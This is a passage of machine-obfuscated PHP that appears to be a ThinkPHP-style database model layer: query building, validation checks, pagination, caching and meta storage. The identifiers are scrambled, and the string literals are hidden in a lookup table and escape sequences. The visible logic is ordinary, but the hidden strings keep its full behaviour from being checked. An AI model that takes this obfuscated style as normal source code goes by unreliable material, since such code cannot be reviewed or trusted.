{ return !1; } return !0; default: return $this->check($°§’à†å[$Á‘¸ı¼Ö[0]], $Á‘¸ı¼Ö[1], $Á‘¸ı¼Ö[4]); } } public function check($Á»šµšä, $ÛõÄÛµ, $äı˜Ç¡ø = "\162\x65\x67\145\170") { $¨áÃÅÊ =& $_SERVER[Ã¶¡¶„æ]; $äı˜Ç¡ø = strtolower(trim($äı˜Ç¡ø)); switch ($äı˜Ç¡ø) { case $¨áÃÅÊ[7]: case $¨áÃÅÊ[332]: $®ÖÉ´Ó’ = is_array($ÛõÄÛµ) ? $ÛõÄÛµ : explode($¨áÃÅÊ[50], $ÛõÄÛµ); return $äı˜Ç¡ø == $¨áÃÅÊ[7] ? in_array($Á»šµšä, $®ÖÉ´Ó’) : !in_array($Á»šµšä, $®ÖÉ´Ó’); case $¨áÃÅÊ[333]: case $¨áÃÅÊ[334]: if (is_array($ÛõÄÛµ)) { $¸­•ú = $ÛõÄÛµ[0]; $“È‡˜§ = $ÛõÄÛµ[1]; } else { list($¸­•ú, $“È‡˜§) = explode($¨áÃÅÊ[50], $ÛõÄÛµ); } return $äı˜Ç¡ø == $¨áÃÅÊ[333] ? $Á»šµšä >= $¸­•ú && $Á»šµšä <= $“È‡˜§ : $Á»šµšä < $¸­•ú || $Á»šµšä > $“È‡˜§; case $¨áÃÅÊ[335]: case $¨áÃÅÊ[336]: return $äı˜Ç¡ø == $¨áÃÅÊ[335] ? $Á»šµšä == $ÛõÄÛµ : $Á»šµšä != $ÛõÄÛµ; case $¨áÃÅÊ[337]: $¦òŸ«í« = mb_strlen($Á»šµšä, $¨áÃÅÊ[338]); if (strpos($ÛõÄÛµ, $¨áÃÅÊ[50])) { list($¸­•ú, $“È‡˜§) = explode($¨áÃÅÊ[50], $ÛõÄÛµ); return $¦òŸ«í« >= $¸­•ú && $¦òŸ«í« <= $“È‡˜§; } else { return $¦òŸ«í« == $ÛõÄÛµ; } case $¨áÃÅÊ[339]: list($üÏ÷­©Ë, $¯Ó½) = explode($¨áÃÅÊ[50], $ÛõÄÛµ); if (!is_numeric($üÏ÷­©Ë)) { $üÏ÷­©Ë = strtotime($üÏ÷­©Ë); } if (!is_numeric($¯Ó½)) { $¯Ó½ = strtotime($¯Ó½); } return NOW_TIME >= $üÏ÷­©Ë && NOW_TIME <= $¯Ó½; case $¨áÃÅÊ[340]: return in_array(get_client_ip(), explode($¨áÃÅÊ[50], $ÛõÄÛµ)); case $¨áÃÅÊ[341]: return !in_array(get_client_ip(), explode($¨áÃÅÊ[50], $ÛõÄÛµ)); case $¨áÃÅÊ[328]: default: return $this->regex($Á»šµšä, $ÛõÄÛµ); } } public function query($­ïÊ‘‚Œ, $Æ ±ªé = false) { $¼›¤¥š =& $_SERVER[Ã¶¡¶„æ]; if (!is_bool($Æ ±ªé) && !is_array($Æ ±ªé)) { $Æ ±ªé = func_get_args(); array_shift($Æ ±ªé); } $­ïÊ‘‚Œ = str_replace(array($¼›¤¥š[231], $¼›¤¥š[342]), $¼›¤¥š[53], $­ïÊ‘‚Œ); $­ïÊ‘‚Œ = $this->parseSql($­ïÊ‘‚Œ, $Æ ±ªé); return $this->db->query($­ïÊ‘‚Œ); } public function execute($Óë†ì‘Â, $º«¤øÅ˜ = false) { if (!is_bool($º«¤øÅ˜) && !is_array($º«¤øÅ˜)) { $º«¤øÅ˜ = func_get_args(); array_shift($º«¤øÅ˜); } $Óë†ì‘Â = $this->parseSql($Óë†ì‘Â, $º«¤øÅ˜); return $this->db->execute($Óë†ì‘Â); } protected function parseSql($â­­§ , $ª¶ÄæÂÃ) { $„²…¿†¡ =& $_SERVER[Ã¶¡¶„æ]; if (!0 === $ª¶ÄæÂÃ) { $À¥šó¶¢ = $this->_parseOptions(); $â­­§  = $this->db->parseSql($â­­§ , $À¥šó¶¢); } elseif (is_array($ª¶ÄæÂÃ)) { $ª¶ÄæÂÃ = array_map(array($this->db, $„²…¿†¡[343]), $ª¶ÄæÂÃ); $â­­§  = vsprintf($â­­§ , $ª¶ÄæÂÃ); } else { $â­­§  = strtr($â­­§ , array($„²…¿†¡[344] => $this->getTableName(), $„²…¿†¡[345] => think_config($„²…¿†¡[244]))); } $this->db->setModel($this->name); return $â­­§ ; } public function db($ÏÀ¢ÒÈˆ = '', $‹ò´‘—Ú = '', $â™ß¨­ö = array()) { $ÂÎ­•³Ç =& $_SERVER[Ã¶¡¶„æ]; if ($ÂÎ­•³Ç[12] === $ÏÀ¢ÒÈˆ && $this->db) { return $this->db; } static $¦¿Š÷„ = array(); static $Ù†³£½ù = array(); if (!isset($Ù†³£½ù[$ÏÀ¢ÒÈˆ]) || isset($Ù†³£½ù[$ÏÀ¢ÒÈˆ]) && $‹ò´‘—Ú && $¦¿Š÷„[$ÏÀ¢ÒÈˆ] != $‹ò´‘—Ú) { if (!empty($‹ò´‘—Ú) && is_string($‹ò´‘—Ú) && !1 === strpos($‹ò´‘—Ú, $ÂÎ­•³Ç[8])) { $‹ò´‘—Ú = think_config($‹ò´‘—Ú); } $ÏÀ¢ÒÈˆ = think_guid($‹ò´‘—Ú); $Ù†³£½ù[$ÏÀ¢ÒÈˆ] = Db::getInstance($‹ò´‘—Ú); } elseif (NULL === $‹ò´‘—Ú) { $Ù†³£½ù[$ÏÀ¢ÒÈˆ]->close(); unset($Ù†³£½ù[$ÏÀ¢ÒÈˆ]); return; } if (!empty($â™ß¨­ö)) { if (is_string($â™ß¨­ö)) { parse_str($â™ß¨­ö, $â™ß¨­ö); } foreach ($â™ß¨­ö as $¿ğş”ò© => $£ ŠøÍ) { $this->setProperty($¿ğş”ò©, $£ ŠøÍ); } } $¦¿Š÷„[$ÏÀ¢ÒÈˆ] = $‹ò´‘—Ú; $this->db = $Ù†³£½ù[$ÏÀ¢ÒÈˆ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $õâªÍÍó = get_class($this); if ($õâªÍÍó == $_SERVER[Ã¶¡¶„æ][346]) { return $this->name; } $this->name = substr($õâªÍÍó, 0, -5); } return $this->name; } public function getTableName() { $éì†ç¦Ÿ =& $_SERVER[Ã¶¡¶„æ]; if (empty($this->trueTableName)) { $éåÅˆßÁ = !empty($this->tablePrefix) ? $this->tablePrefix : $éì†ç¦Ÿ[12]; if (!empty($this->tableName)) { $éåÅˆßÁ .= $this->tableName; } else { $éåÅˆßÁ .= think_parse_name($this->name); } $this->trueTableName = strtolower($éåÅˆßÁ); } return (!empty($this->dbName) ? $this->dbName . $éì†ç¦Ÿ[10] : $éì†ç¦Ÿ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $‚Êº¡Æ =& $_SERVER[Ã¶¡¶„æ]; return isset($this->fields[$‚Êº¡Æ[251]]) ? $this->fields[$‚Êº¡Æ[251]] : $this->pk; } public function getDbFields() { $ìµÁ½—Ú =& $_SERVER[Ã¶¡¶„æ]; if (isset($this->options[$ìµÁ½—Ú[279]])) { $…§¿õŠÏ = $this->db->getFields($this->options[$ìµÁ½—Ú[279]]); return $…§¿õŠÏ ? array_keys($…§¿õŠÏ) : !1; } if ($this->fields) { $…§¿õŠÏ = $this->fields; unset($…§¿õŠÏ[$ìµÁ½—Ú[250]], $…§¿õŠÏ[$ìµÁ½—Ú[251]], $…§¿õŠÏ[$ìµÁ½—Ú[252]], $…§¿õŠÏ[$ìµÁ½—Ú[249]]); return $…§¿õŠÏ; } return !1; } public function data($ãÅÄşèõ = '') { $‰±€ÜÕÆ =& $_SERVER[Ã¶¡¶„æ]; if ($‰±€ÜÕÆ[12] === $ãÅÄşèõ && !empty($this->data)) { return $this->data; } if (is_object($ãÅÄşèõ)) { $ãÅÄşèõ = get_object_vars($ãÅÄşèõ); } elseif (is_string($ãÅÄşèõ)) { parse_str($ãÅÄşèõ, $ãÅÄşèõ); } elseif (!is_array($ãÅÄşèõ)) { think_exception(think_lang($‰±€ÜÕÆ[271])); } $this->data = $ãÅÄşèõ; return $this; } public function join($¹„Í¿Â†) { $”Ãæ”úà =& $_SERVER[Ã¶¡¶„æ]; if (is_array($¹„Í¿Â†)) { $this->options[$”Ãæ”úà[282]] = $¹„Í¿Â†; } elseif (!empty($¹„Í¿Â†)) { $this->options[$”Ãæ”úà[282]][] = $¹„Í¿Â†; } return $this; } public function union($ò­Æ£éù, $ ³‹úµŠ = false) { $ÜÉ„ùÚœ =& $_SERVER[Ã¶¡¶„æ]; if (empty($ò­Æ£éù)) { return $this; } if ($ ³‹úµŠ) { $this->options[$ÜÉ„ùÚœ[347]][$ÜÉ„ùÚœ[348]] = !0; } if (is_object($ò­Æ£éù)) { $ò­Æ£éù = get_object_vars($ò­Æ£éù); } if (is_string($ò­Æ£éù)) { $ÕÙ°’ä¦ = $ò­Æ£éù; } elseif (is_array($ò­Æ£éù)) { if (isset($ò­Æ£éù[0])) { $this->options[$ÜÉ„ùÚœ[347]] = array_merge($this->options[$ÜÉ„ùÚœ[347]], $ò­Æ£éù); return $this; } else { $ÕÙ°’ä¦ = $ò­Æ£éù; } } else { think_exception(think_lang($ÜÉ„ùÚœ[271])); } $this->options[$ÜÉ„ùÚœ[347]][] = $ÕÙ°’ä¦; return $this; } public function cache($¤ƒ¯ß¢Ö = true, $«š«óË = null, $¾¬àƒª˜ = '') { $˜ •ù¡ =& $_SERVER[Ã¶¡¶„æ]; if (!1 !== $¤ƒ¯ß¢Ö) { $this->options[$˜ •ù¡[349]] = array($˜ •ù¡[94] => $¤ƒ¯ß¢Ö, $˜ •ù¡[339] => $«š«óË, $˜ •ù¡[33] => $¾¬àƒª˜); } return $this; } public function field($¯“‡½¤, $¾èÖ·ğâ = false) { $Ëà×ñş² =& $_SERVER[Ã¶¡¶„æ]; if (!0 === $¯“‡½¤) { $ŞĞí™Úğ = $this->getDbFields(); $¯“‡½¤ = $ŞĞí™Úğ ? $ŞĞí™Úğ : $Ëà×ñş²[188]; } elseif ($¾èÖ·ğâ) { if (is_string($¯“‡½¤)) { $¯“‡½¤ = explode($Ëà×ñş²[50], $¯“‡½¤); } $ŞĞí™Úğ = $this->getDbFields(); $¯“‡½¤ = $ŞĞí™Úğ ? array_diff($ŞĞí™Úğ, $¯“‡½¤) : $¯“‡½¤; } $this->options[$Ëà×ñş²[273]] = $¯“‡½¤; return $this; } public function scope($áàÚ‰àµ = '', $½Á–ˆìÁ = NULL) { $÷ÛÕÆõ =& $_SERVER[Ã¶¡¶„æ]; if ($÷ÛÕÆõ[12] === $áàÚ‰àµ) { if (isset($this->_scope[$÷ÛÕÆõ[37]])) { $ÄÁİÜÔ = $this->_scope[$÷ÛÕÆõ[37]]; } else { return $this; } } elseif (is_string($áàÚ‰àµ)) { $„ëïææ¹ = explode($÷ÛÕÆõ[50], $áàÚ‰àµ); $ÄÁİÜÔ = array(); foreach ($„ëïææ¹ as $ŞñÛ·ù†) { if (!isset($this->_scope[$ŞñÛ·ù†])) { continue; } $ÄÁİÜÔ = array_merge($ÄÁİÜÔ, $this->_scope[$ŞñÛ·ù†]); } if (!empty($½Á–ˆìÁ) && is_array($½Á–ˆìÁ)) { $ÄÁİÜÔ = array_merge($ÄÁİÜÔ, $½Á–ˆìÁ); } } elseif (is_array($áàÚ‰àµ)) { $ÄÁİÜÔ = $áàÚ‰àµ; } if (is_array($ÄÁİÜÔ) && !empty($ÄÁİÜÔ)) { $this->options = array_merge($this->options, array_change_key_case($ÄÁİÜÔ)); } return $this; } public function where($ÚçìÀœ, $ƒ¢–Ì¨ = null) { $¸”÷ÇœÌ =& $_SERVER[Ã¶¡¶„æ]; if (!is_null($ƒ¢–Ì¨) && is_string($ÚçìÀœ)) { if (!is_array($ƒ¢–Ì¨)) { $ƒ¢–Ì¨ = func_get_args(); array_shift($ƒ¢–Ì¨); } $ƒ¢–Ì¨ = array_map(array($this->db, $¸”÷ÇœÌ[343]), $ƒ¢–Ì¨); $ÚçìÀœ = vsprintf($ÚçìÀœ, $ƒ¢–Ì¨); } elseif (is_object($ÚçìÀœ)) { $ÚçìÀœ = get_object_vars($ÚçìÀœ); } elseif (is_array($ÚçìÀœ)) { foreach ($ÚçìÀœ as $‹´¸œå¶ => $âÏ­¾ê£) { if ((is_numeric($‹´¸œå¶) || !$‹´¸œå¶) && is_string($âÏ­¾ê£)) { if (strpos($âÏ­¾ê£, $¸”÷ÇœÌ[350]) === 0) { continue; } think_trace($¸”÷ÇœÌ[351], $¸”÷ÇœÌ[12], $¸”÷ÇœÌ[49]); die; } } } if (is_string($ÚçìÀœ) && $¸”÷ÇœÌ[12] != $ÚçìÀœ) { $èæÊµşÈ = array(); $èæÊµşÈ[$¸”÷ÇœÌ[352]] = $ÚçìÀœ; $ÚçìÀœ = $èæÊµşÈ; } if (isset($this->options[$¸”÷ÇœÌ[275]])) { $this->options[$¸”÷ÇœÌ[275]] = array_merge($this->options[$¸”÷ÇœÌ[275]], $ÚçìÀœ); } else { $this->options[$¸”÷ÇœÌ[275]] = $ÚçìÀœ; } return $this; } public function limit($Øá‰·ëı, $èáãúÏ¢ = null) { $¨·½ê¨Ê =& $_SERVER[Ã¶¡¶„æ]; $this->options[$¨·½ê¨Ê[292]] = is_null($èáãúÏ¢) ? $Øá‰·ëı : $Øá‰·ëı . $¨·½ê¨Ê[50] . $èáãúÏ¢; return $this; } public function page($®óÂªê©, $Á¨õ™’ = null) { $·¢´²¶³ =& $_SERVER[Ã¶¡¶„æ]; $this->options[$·¢´²¶³[353]] = is_null($Á¨õ™’) ? $®óÂªê© : $®óÂªê© . $·¢´²¶³[50] . $Á¨õ™’; return $this; } public function comment($½£ïóûû) { $this->options[$_SERVER[Ã¶¡¶„æ][354]] = $½£ïóûû; return $this; } public function setProperty($Ø³óï˜ó, $‡®õˆù) { if (property_exists($this, $Ø³óï˜ó)) { $this->{$Ø³óï˜ó} = $‡®õˆù; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\x54\151\155\145", "\164\x69\x6d\145", "\x69\156\163\145\162\x74\x2c\x75\x70\x64\x61\164\145", "\x66\165\x6e\x63\x74\x69\x6f\x6e"), array("\x63\x72\145\141\x74\x65\x54\x69\x6d\145", "\x74\x69\155\x65", "\151\x6e\x73\x65\x72\164", "\146\x75\x6e\143\164\151\157\156")); public function setDataAuto($½¸³ÌÚÔ) { $this->dataAuto = $½¸³ÌÚÔ; } public function __construct($Ê÷¦ÒÎŸ = '', $ß€ùİí = '', $ã…çÎÖÛ = '') { parent::__construct($Ê÷¦ÒÎŸ, $ß€ùİí, $ã…çÎÖÛ); } protected $tableMeta = array(); protected function _beforeInsert(&$—Ö¨®üŠ, $ÄğÁÅ…ª) { $ä‹Êø¯ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->checkDataAutoHas($ä‹Êø¯[355])) { return; } $this->dataBeforeFilter($—Ö¨®üŠ, $ä‹Êø¯[355]); } protected function _beforeUpdate(&$ßÌÀÁóÖ, $‘È·ˆÉ†) { $‡§Œùäæ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->checkDataAutoHas($‡§Œùäæ[356])) { return; } $this->dataBeforeFilter($ßÌÀÁóÖ, $‡§Œùäæ[356]); } protected function _afterSelect(&$áŒ¥•úµ, $”Ùó÷Ü) { if (!is_array($áŒ¥•úµ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ã¶¡¶„æ][357])) { return; } foreach ($áŒ¥•úµ as &$ÏæÎ¿†) { $this->dataAfterFilter($ÏæÎ¿†); } unset($ÏæÎ¿†); } protected function _afterFind(&$ÇÛœ‘¦, $Ô°¼çëê) { if (!is_array($ÇÛœ‘¦)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ã¶¡¶„æ][357])) { return; } $this->dataAfterFilter($ÇÛœ‘¦); } public static function textEncode($Îƒ¼üñê) { if (!$Îƒ¼üñê) { return $Îƒ¼üñê; } $¸öÁ¨ô = json_encode($Îƒ¼üñê); $¸öÁ¨ô = preg_replace_callback($_SERVER[Ã¶¡¶„æ][358], function ($Æ­¡ºÒé) { return addslashes($Æ­¡ºÒé[0]); }, $¸öÁ¨ô); return json_decode($¸öÁ¨ô); } public static function textDecode($’ÊØô…Ñ) { $‚ÔÂİ³Ô =& $_SERVER[Ã¶¡¶„æ]; $ŞàÉÌë’ = json_encode($’ÊØô…Ñ); $ŞàÉÌë’ = preg_replace_callback($‚ÔÂİ³Ô[359], function ($˜–ôë±) { return $_SERVER[Ã¶¡¶„æ][97]; }, $ŞàÉÌë’); return json_decode($ŞàÉÌë’); } public function setAutoIncrement($ÓÆçÎæ¯) { $áÂ¨Æ±è = array($this->getPk() => $ÓÆçÎæ¯); $ÈûğÅëÍ = $this->data($áÂ¨Æ±è)->add(); if ($ÈûğÅëÍ) { $this->delete($ÈûğÅëÍ); } } public function getAutoIncrement() { $®°İ»¢µ = $this->getTableName(); $å™Ûêıù = $this->max($this->getPk()); $çÃ¯…‘Å = $this->query("\163\x68\157\x77\40\x74\x61\x62\x6c\x65\40\x73\164\x61\164\165\x73\40\x77\x68\x65\162\x65\40\116\141\x6d\145\75\47{$®°İ»¢µ}\47"); $ôÍ½Ú = $çÃ¯…‘Å[0][$_SERVER[Ã¶¡¶„æ][360]]; $òàŸ”òä = max($å™Ûêıù, $ôÍ½Ú); return $òàŸ”òä; } protected function _callBefore($š–ÊíôÃ, $­ş”µî€) { return $this->cacheCallCheck($š–ÊíôÃ, $­ş”µî€, !1); } protected function _callAfter($˜å»‡À¥, $€ªûàÉ¬) { return $this->cacheCallCheck($˜å»‡À¥, $€ªûàÉ¬, !0); } protected function cacheFunctionAlias($Ü¯ÜÉûÚ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ØĞ˜´îÔ, $¤ôè¨ˆÑ, $şÂÊ×Ä = false) { $ñ™½µ¶• = $this->cacheFunctionAlias($¤ôè¨ˆÑ); if (!$ñ™½µ¶•) { return; } foreach ($ñ™½µ¶• as $Àİ­ åğ => $óêãóÔŒ) { $Ó­à‰ Ô = $óêãóÔŒ[0]; $™™¶üÄ = explode($_SERVER[Ã¶¡¶„æ][50], $óêãóÔŒ[1]); if ($ØĞ˜´îÔ == $Àİ­ åğ) { return $this->cacheFunctionGet($Àİ­ åğ, $Ó­à‰ Ô); } if ($şÂÊ×Ä && in_array($ØĞ˜´îÔ, $™™¶üÄ)) { $this->cacheFunctionClear($Àİ­ åğ, $Ó­à‰ Ô); } } } public function cacheFunctionGet($å÷€€Ò˜, $À§÷ğé) { $ÑÊ´áÆ… = $this->cacheKeyMake($å÷€€Ò˜, $À§÷ğé); $•ºÇ«÷É = Cache::get($ÑÊ´áÆ…); if (!is_array($•ºÇ«÷É)) { $•ºÇ«÷É = call_user_func_array(array($this, $å÷€€Ò˜), array($À§÷ğé, !0)); Cache::set($ÑÊ´áÆ…, $•ºÇ«÷É); } return $•ºÇ«÷É; } public function cacheFunctionClear($“Üõ©Ü, $ôş„†ãû) { $¢•‘ß×Ò = $ôş„†ãû; if (!is_array($ôş„†ãû)) { $¢•‘ß×Ò = array($ôş„†ãû); } foreach ($¢•‘ß×Ò as $À¼É×ôÊ) { $­‰æê¢ = $this->cacheKeyMake($“Üõ©Ü, $À¼É×ôÊ); Cache::remove($­‰æê¢); } } private function cacheKeyMake($ÈÍé‹Áñ, $¿Š»¹Äå) { $Éšª­‘ =& $_SERVER[Ã¶¡¶„æ]; return get_class($this) . $Éšª­‘[11] . $ÈÍé‹Áñ . $Éšª­‘[361] . $¿Š»¹Äå; } protected function selectPageReset() { $üí¹Ç =& $_SERVER[Ã¶¡¶„æ]; if (isset($GLOBALS[$üí¹Ç[362]])) { return; } $GLOBALS[$üí¹Ç[362]] = isset($GLOBALS[$üí¹Ç[7]][$üí¹Ç[363]]) ? $GLOBALS[$üí¹Ç[7]][$üí¹Ç[363]] : !1; $GLOBALS[$üí¹Ç[364]] = isset($GLOBALS[$üí¹Ç[7]][$üí¹Ç[353]]) ? $GLOBALS[$üí¹Ç[7]][$üí¹Ç[353]] : !1; $GLOBALS[$üí¹Ç[7]][$üí¹Ç[363]] = !1; $GLOBALS[$üí¹Ç[7]][$üí¹Ç[353]] = !1; } protected function selectPageRestore() { $Âóé‰üı =& $_SERVER[Ã¶¡¶„æ]; if (!isset($GLOBALS[$Âóé‰üı[362]])) { return; } $GLOBALS[$Âóé‰üı[7]][$Âóé‰üı[363]] = $GLOBALS[$Âóé‰üı[362]]; $GLOBALS[$Âóé‰üı[7]][$Âóé‰üı[353]] = $GLOBALS[$Âóé‰üı[364]]; if ($GLOBALS[$Âóé‰üı[7]][$Âóé‰üı[363]] === !1) { unset($GLOBALS[$Âóé‰üı[7]][$Âóé‰üı[363]]); } if ($GLOBALS[$Âóé‰üı[7]][$Âóé‰üı[353]] === !1) { unset($GLOBALS[$Âóé‰üı[7]][$Âóé‰üı[353]]); } unset($GLOBALS[$Âóé‰üı[362]]); unset($GLOBALS[$Âóé‰üı[364]]); } protected function selectPage($ÓªÏº§ = 200, $İ¿²Š€Ÿ = 1) { $Ãî™å¾û =& $_SERVER[Ã¶¡¶„æ]; global $in; $Œ¬¾Õ¥€ = $this->optionsValue(); $‚š™åş = 50000; $ÓªÏº§ = isset($in[$Ãî™å¾û[363]]) && $in[$Ãî™å¾û[363]] ? $in[$Ãî™å¾û[363]] : $ÓªÏº§; if ($ÓªÏº§ === -1) { $in[$Ãî™å¾û[363]] = !1; $‚š™åş = 100000000; $ÓªÏº§ = $‚š™åş; } $²ÁÉİ£Ò = $Œ¬¾Õ¥€; $²ÁÉİ£Ò[$Ãî™å¾û[365]] = array(); $ÓªÏº§ = intval($ÓªÏº§); $ÓªÏº§ = $ÓªÏº§ <= 5 ? 5 : ($ÓªÏº§ >= $‚š™åş ? $‚š™åş : $ÓªÏº§); $İ¿²Š€Ÿ = intval(isset($in[$Ãî™å¾û[353]]) && $in[$Ãî™å¾û[353]] ? $in[$Ãî™å¾û[353]] : $İ¿²Š€Ÿ); $İ¿²Š€Ÿ = $İ¿²Š€Ÿ <= 1 ? 1 : $İ¿²Š€Ÿ; $®Œ¾ŠÇŞ = array(); $´æ«‘Ş = 1; if ($İ¿²Š€Ÿ == 1 && $´æ«‘Ş) { $this->optionsValue($Œ¬¾Õ¥€); $®Œ¾ŠÇŞ = $this->page($İ¿²Š€Ÿ, $ÓªÏº§)->select(); $õËËñµ = is_array($®Œ¾ŠÇŞ) ? count($®Œ¾ŠÇŞ) : 0; if ($õËËñµ < $ÓªÏº§) { $æÆËóİ = 1; } else { $this->optionsValue($²ÁÉİ£Ò); $õËËñµ = intval($this->count()); $æÆËóİ = ceil($õËËñµ / $ÓªÏº§); } } else { $this->optionsValue($²ÁÉİ£Ò); $õËËñµ = intval($this->count()); $æÆËóİ = ceil($õËËñµ / $ÓªÏº§); $İ¿²Š€Ÿ = $İ¿²Š€Ÿ >= $æÆËóİ ? $æÆËóİ : $İ¿²Š€Ÿ; $this->optionsValue($Œ¬¾Õ¥€); $®Œ¾ŠÇŞ = $this->page($İ¿²Š€Ÿ, $ÓªÏº§)->select(); } if (!is_array($®Œ¾ŠÇŞ)) { $®Œ¾ŠÇŞ = array(); } if ($æÆËóİ == 1) { $õËËñµ = count($®Œ¾ŠÇŞ); } $‹ø™®ñ = array($Ãî™å¾û[366] => array($Ãî™å¾û[367] => $õËËñµ, $Ãî™å¾û[363] => $ÓªÏº§, $Ãî™å¾û[353] => $İ¿²Š€Ÿ, $Ãî™å¾û[368] => $æÆËóİ), $Ãî™å¾û[369] => $®Œ¾ŠÇŞ); return $‹ø™®ñ; } protected function checkLength($ö–—·Óê, $ïÂ–¨¿· = 0, $¬¢™Ÿ¸° = '') { $˜½ĞÄéó =& $_SERVER[Ã¶¡¶„æ]; $ïÂ–¨¿· = $ïÂ–¨¿· ? $ïÂ–¨¿· : 65536; if (!$ö–—·Óê || strlen($ö–—·Óê) < $ïÂ–¨¿·) { return; } $¬¢™Ÿ¸° = $¬¢™Ÿ¸° ? $¬¢™Ÿ¸° . $˜½ĞÄéó[71] : $˜½ĞÄéó[12]; show_json($¬¢™Ÿ¸° . LNG($˜½ĞÄéó[370]) . "\x28{$ïÂ–¨¿·}\51", !1); } protected function metaSet($òÍ‘ã‘š, $ùùïÀŠ = null, $’«àÊòÉ = null) { $ ª„Ò÷ç =& $_SERVER[Ã¶¡¶„æ]; if (!$this->tableMeta || !$òÍ‘ã‘š) { return !1; } $“á…ë± = $this->tableMeta[$ ª„Ò÷ç[371]]; $ˆïØ¨” = $this->tableMeta[$ ª„Ò÷ç[372]]; $ßÜù²Šô = Model($ˆïØ¨”); $‘¶ÂÁ‘ = array($“á…ë± => $òÍ‘ã‘š, $ ª„Ò÷ç[373] => $ùùïÀŠ); if (is_null($ùùïÀŠ)) { return $ßÜù²Šô->where(array($“á…ë± => $òÍ‘ã‘š))->delete(); } if (is_null($’«àÊòÉ) && is_string($ùùïÀŠ)) { return $ßÜù²Šô->where($‘¶ÂÁ‘)->delete(); } $†³Ñ¾µë = is_array($ùùïÀŠ) ? $ùùïÀŠ : array(); if (is_string($ùùïÀŠ)) { $†³Ñ¾µë[$ùùïÀŠ] = $’«àÊòÉ; } $Îşç‹•€ = array(); foreach ($†³Ñ¾µë as $Ş¾ş¦ÛÁ => $ß‰·Ìßö) { if (is_null($ß‰·Ìßö) && is_string($Ş¾ş¦ÛÁ)) { $ßÜù²Šô->where(array($“á…ë± => $òÍ‘ã‘š, $ ª„Ò÷ç[373] => $Ş¾ş¦ÛÁ))->delete(); continue; } $this->checkLength($ß‰·Ìßö, !1, $ˆïØ¨” . $ ª„Ò÷ç[4] . $Ş¾ş¦ÛÁ); $Îşç‹•€[] = array($“á…ë± => $òÍ‘ã‘š, $ ª„Ò÷ç[94] => $Ş¾ş¦ÛÁ, $ ª„Ò÷ç[374] => $ß‰·Ìßö); } $÷—ÍµÄ = $ ª„Ò÷ç[375] . $ˆïØ¨”; CacheLock::lock($÷—ÍµÄ); $ßÜù²Šô->where(array($“á…ë± => $òÍ‘ã‘š))->addAll($Îşç‹•€, array(), !0); CacheLock::unlock($÷—ÍµÄ); return !0; } public function metaGet($ü¼òğõ­, $¬õùşÙÜ = false) { $ãÅÆ´ıñ =& $_SERVER[Ã¶¡¶„æ]; if (!$this->tableMeta) { return array(); } $®°³à » = $this->tableMeta[$ãÅÆ´ıñ[371]]; $ÛËõ÷åÂ = Model($this->tableMeta[$ãÅÆ´ıñ[372]]); if ($¬õùşÙÜ) { $‹òÙş¡ = array($®°³à » => $ü¼òğõ­, $ãÅÆ´ıñ[94] => $¬õùşÙÜ); return $ÛËõ÷åÂ->where($‹òÙş¡)->getField($ãÅÆ´ıñ[374]); } $‹òÙş¡ = array($®°³à » => $ü¼òğõ­); $ş„Ìø‡÷ = $ÛËõ÷åÂ->field($ãÅÆ´ıñ[376])->where($‹òÙş¡)->select(); $ş„Ìø‡÷ = array_to_keyvalue($ş„Ìø‡÷, $ãÅÆ´ıñ[94], $ãÅÆ´ıñ[374]); return $ş„Ìø‡÷; } private function checkDataAutoHas($…äªÔÀ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $À¨™†±²) { if (in_array($…äªÔÀ, explode($_SERVER[Ã¶¡¶„æ][50], $À¨™†±²[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ä‰Ğ‰, $êß­Œƒª) { $‚¤¦ë®¥ =& $_SERVER[Ã¶¡¶„æ]; if (!is_array($ä‰Ğ‰)) { return; } foreach ($this->dataAuto as $„ç²âË) { $ ¡Ù™Ú = $„ç²âË[0]; if (!in_array($êß­Œƒª, explode($‚¤¦ë®¥[50], $„ç²âË[2]))) { continue; } switch (trim($„ç²âË[3])) { case $‚¤¦ë®¥[321]: case $‚¤¦ë®¥[322]: $åí‚€‘ = $„ç²âË[1]; $ÙÂœíı = isset($„ç²âË[4]) ? (array) $„ç²âË[4] : array(); if ($åí‚€‘ == $‚¤¦ë®¥[203] && array_key_exists($ ¡Ù™Ú, $ä‰Ğ‰)) { if (!$ä‰Ğ‰[$ ¡Ù™Ú]) { unset($ä‰Ğ‰[$ ¡Ù™Ú]); } break; } if (isset($ä‰Ğ‰[$ ¡Ù™Ú])) { array_unshift($ÙÂœíı, $ä‰Ğ‰[$ ¡Ù™Ú]); } if ($‚¤¦ë®¥[321] == $„ç²âË[3]) { $ä‰Ğ‰[$ ¡Ù™Ú] = call_user_func_array($åí‚€‘, $ÙÂœíı); } else { $ä‰Ğ‰[$ ¡Ù™Ú] = call_user_func_array(array(&$this, $åí‚€‘), $ÙÂœíı); } break; case $‚¤¦ë®¥[270]: if (isset($ä‰Ğ‰[$ ¡Ù™Ú]) && $ä‰Ğ‰[$ ¡Ù™Ú]) { $ä‰Ğ‰[$ ¡Ù™Ú] = call_user_func_array(array(&$this, $„ç²âË[1]), array($ä‰Ğ‰[$ ¡Ù™Ú])); } break; case $‚¤¦ë®¥[273]: $ä‰Ğ‰[$ ¡Ù™Ú] = $ä‰Ğ‰[$„ç²âË[1]]; break; case $‚¤¦ë®¥[294]: if (isset($ä‰Ğ‰[$ ¡Ù™Ú]) && !is_string($ä‰Ğ‰[$ ¡Ù™Ú])) { $ä‰Ğ‰[$ ¡Ù™Ú] = json_encode_force($ä‰Ğ‰[$ ¡Ù™Ú]); } break; case $‚¤¦ë®¥[323]: if 